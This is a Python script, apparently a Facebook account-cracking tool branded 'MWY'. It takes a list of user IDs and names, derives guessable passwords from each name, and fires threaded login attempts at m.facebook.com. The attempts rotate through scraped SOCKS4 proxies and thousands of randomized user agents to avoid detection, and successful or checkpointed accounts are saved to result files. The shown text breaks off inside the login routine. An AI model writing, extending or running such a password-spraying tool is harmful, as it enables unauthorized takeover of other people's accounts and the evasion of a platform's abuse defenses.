import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
import requests,zlib,platform
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] \x1b[1;96mMWY-XD')
prox=open('.prox.txt','r').read().splitlines()
user_agent=['Mozilla/5.0 (Linux; U; Android 9; ar-iq; PAR-LX1M Build/HUAWEIPAR-LX1M) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/ 1.3.0','Mozilla/5.0 (Linux; U; Android 10; ru-ru; Mi MIX 2S Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/ 1.3.3','Mozilla/5.0 (Linux; U; Android 8.1.0; en-in; Redmi Go Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser /1.5.3','Mozilla/5.0 (Linux; U; Android 4.4.4; ru-ru; HM 1S Build/KTU84P) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/1.5 .3','Mozilla/5.0 (Linux; U; Android 10; ru-ru; Mi MIX 2S Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/ 1.3.3','Mozilla/5.0 (Linux; U; Android 4.4.4; ru-ru; HM 1S Build/KTU84P) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/1.5 .3','Mozilla/5.0 (Linux; U; Android 9; ru-ru; ANE-LX1 Build/HUAWEIANE-L21) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/ 2.4.0','Mozilla/5.0 (Linux; U; Android 10; ru-ru; Redmi Note 9 Pro Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser /2.4.0','Mozilla/5.0 (Linux; U; Android 7.1.2; ru-ru; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.3 .1']
uas_bawaan = "Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920"
uas_nokiac2 = "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 seperti Mac OS X) AppleWebKit/605.1.15 (KHTML, seperti Gecko) Versi/15.6 Seluler/15E148 DuckDuckGo/7 Safari/605.1.15"
uas_nokiax20 = "Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/101.0.4951.61 DuckDuckGo/5 Safari/537.36"
uas_nokiax = "Mozilla/5.0 (iPod touch; CPU iPhone OS 12_5_1 seperti Mac OS X) AppleWebKit/605.1.15 (KHTML, seperti Gecko) Versi/12.5 Seluler/15E148 DuckDuckGo/7 Safari/605.1.15"
uas_samsungse = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_3 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Mobile/15A432 DuckDuckGo/7"
uas_redmi9a = "Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/104.0.5112.69 Seluler Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.71 Seluler Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/ 312.0.0.10.103;]"
uas_chromelinux = "Mozilla/5.0 (Linux; U; Android 4.1.1; pl-PL; C1505 Build/11.3.A.2.13) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.9.900 Mobile Safari/537.36"
uas_j7prime = "Mozilla/5.0 (Linux; U; Android 4.2.2; JP5s Inmate Media Device Build/JP5JDQ47) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.9.3.900 Mobile Safari/537.36"
uas_tes = "Mozilla/5.0 (Linux; U; Android 4.4.2; ru-RU; T102MS3G Build/Oysters) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36"
uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN","Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30","Mozilla/5.0(Linux;U;Android 5.1.1;zh-CN;OPPO A33 Build/LMY47V) AppleWebKit/537.36(KHTML,like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.7.0.953 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 4.2.1; ru-RU; SGH-I337 Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.2.5.932 U3/0.8.0 Mobile Safari/E7FBAF","Mozilla/5.0 (Linux; U; Android 4.4.4; en-US; XT1022 Build/KXC21.5-40) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.7.0.636 U3/0.8.0 Mobile Safari/534.30"])
uas_nokiac3 = "UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; en-US; SM-G532G Build/MMB29T) U2/1.0.0 UCMini/10.9.0.946 (SpeedMode; Android 6.0.1; SM-G532G Build/MMB29T) Mobile"
uas_iphone = "UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; en-US; Lenny4 Build/NRD90M) U2/1.0.0 UCMini/10.9.0.946 (SpeedMode; Android 7.0; Lenny4 Build/NRD90M) Mobile"
uas_nokia5plus = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.12785 YaBrowser/13.12.1599.12785 Safari/537.36"
uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 9; Pearl K3 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV /322.0.0.6.110;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 10 Lite Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/107.0.5304.105 Seluler Safari/537.36[FBAN/EMA;FBLC/hi_IN ;FBAV/330.0.0.10.108;]","Mozilla/5.0 (Linux; Android 5.1; PHQ520 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/298.0. 0.10.115;]","Mozilla/5.0 (Linux; Android 12; RP02 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/ 331.0.0.9.105;]"])
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
for xd in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	ugen2.append(uaku)
for xd in range(10000):
	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Redmi 4A Build/N2G47H)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SM-G530H Build/KTU84P)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'aG', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SM-E426S)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'aG', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SM-M515F)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'aG', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 OPR/73.0.3653.66031'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SM-N975F)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'aG', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 OPR/63.3.3216.58675'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SM-A205GN Build/RP1A.200720.012; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'aG', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Line/12.20.2/IAB'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

for x in range(10):
	a='Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='Linux; Android 7.1.2; Redmi 4A)'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile Safari/E7FBAF'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()


def uaku():
	try:
		ua=open('Aprl.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Kavihacker/hacker/blob/main/Aprl.txt').text
		ua=open('.Aprl.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.Aprl.txt','r').read().splitlines()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])

pwpluss,pwnya=[],[]
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

sys.stdout.write('MWY-XD\x07')
#------------------[ MAIN ]-----------------#

MWY = """\x1b[1;92m

  
  __  ____          ____     __
 |  \/  \ \        / /\ \   / /
 | \  / |\ \  /\  / /  \ \_/ / 
 | |\/| | \ \/  \/ /    \   /  
 | |  | |  \  /\  /      | |   
 |_|  |_|   \/  \/       |_|   


\033[38;3;276;131;0;1m-----------------------------------------------------
 Author   : MOE WAI YAN
 Facebook : MOE WAI YAN
 Github   : MOE WAI YAN
 Tools    : MWY
 Version  : 1.0
-----------------------------------------------------\033[1;97m"""

def menu():
	os.system('clear')
	print(MWY)
	print('\x1b[1;97m [1] File Cloning\n [2] Check Results\n [3] Contact with Admin\n [0] EXIT ')
	print('-----------------------------------------------------')
	Picchi = input(' Choice Option : ')
	if Picchi in ['1']:
		crack_file()
	elif Picchi in ['2','02']:
		result()
	elif Picchi in ['3','03']:
		os.system('xdg-open https://www.facebook.com/moewaiyan.15')
	elif Picchi in ['0']:
		exit()
	else:
		print(' incorrect input')
		back()
def error():
	print(f' try again')
	time.sleep(4)
	back()
	
def result():
	os.system('clear')
	print(MWY)
	print(' [1] Cp Account Check')
	print(' [2] Ok Account Check')
	print(' [0] Back Menu')
	kz = input('\n Choice Option : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' File Not Found')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('You Have No CP Results ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' '+str(len(hem))+' Ids'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' '+str(len(hem))+' Ids'+u)
			geeh = input('\n Choice Option : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' Select Right Option ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'  {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="yellow")
				nocp +=1
			input('[ Click Enter ]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(' No OK FILE HERE ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' '+str(len(hem))+' Ids'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' '+str(len(hem))+' Ids'+u)
			geeh = input('\n Choice Option : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' Select Right Option ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f' {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="green")
				nocp +=1
			input('click 2 ')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print(' Select Right Option ')
		exit()

def crack_file():
	os.system('clear')
	print(MWY)
	o = input(' Put file path\033[1;37m: ')
	print('')
	try:lin = open(o).read().splitlines()
	except:
		print('File Not Found')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	os.system('clear');print(MWY);setting()
	
def setting():
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;97m [1] Method 1\n [2] Method 2 ');print('-----------------------------------------------------')
	hc = input(' Choice Option : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	else:
		method.append('mobile')
	passwrd()
	exit()

def passwrd():
	os.system('clear')
	print(MWY)
	print('\x1b[1;97m Total Ids : '+str(len(id)));print(' \x1b[38;5;208mTurn on & off flight (airplane) mode before use\033[1;37m');print(f'-----------------------------------------------------')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@123')

				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)


def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r [MWY-1M] {P}{loop}{P}/{P}{len(id)}{P} OK{P}/{ok}{P} |{'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": 'm.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"*/*","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"manifest","referer":"https://m.facebook.com/login.php?skip_api_login=1&api_key=117190508050&kid_directed_site=0&app_id=117190508050&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fscope%3Demail%26auth_type%3Dreauthenticate%26state%3D03da9cba7cc21496bf5cac5e0d648fe0%26response_type%3Dcode%26approval_prompt%3Dauto%26redirect_uri%3Dhttps%253A%252F%252Fwww.indievox.com%252Flogin%252Ffacebook%26client_id%3D117190508050%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D819427ef-6b6c-456b-b8c2-833aa552fcfb%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.indievox.com%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D03da9cba7cc21496bf5cac5e0d648fe0%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			link = ses.get(f"https://m.facebook.com/login.php?skip_api_login=1&api_key=117190508050&kid_directed_site=0&app_id=117190508050&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fscope%3Demail%26auth_type%3Dreauthenticate%26state%3D03da9cba7cc21496bf5cac5e0d648fe0%26response_type%3Dcode%26approval_prompt%3Dauto%26redirect_uri%3Dhttps%253A%252F%252Fwww.indievox.com%252Flogin%252Ffacebook%26client_id%3D117190508050%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D819427ef-6b6c-456b-b8c2-833aa552fcfb%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.indievox.com%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D03da9cba7cc21496bf5cac5e0d648fe0%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
			head = ({"Host": 'm.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"*/*","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"manifest","referer":"https://m.facebook.com/login.php?skip_api_login=1&api_key=117190508050&kid_directed_site=0&app_id=117190508050&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fscope%3Demail%26auth_type%3Dreauthenticate%26state%3D03da9cba7cc21496bf5cac5e0d648fe0%26response_type%3Dcode%26approval_prompt%3Dauto%26redirect_uri%3Dhttps%253A%252F%252Fwww.indievox.com%252Flogin%252Ffacebook%26client_id%3D117190508050%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D819427ef-6b6c-456b-b8c2-833aa552fcfb%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.indievox.com%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D03da9cba7cc21496bf5cac5e0d648fe0%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
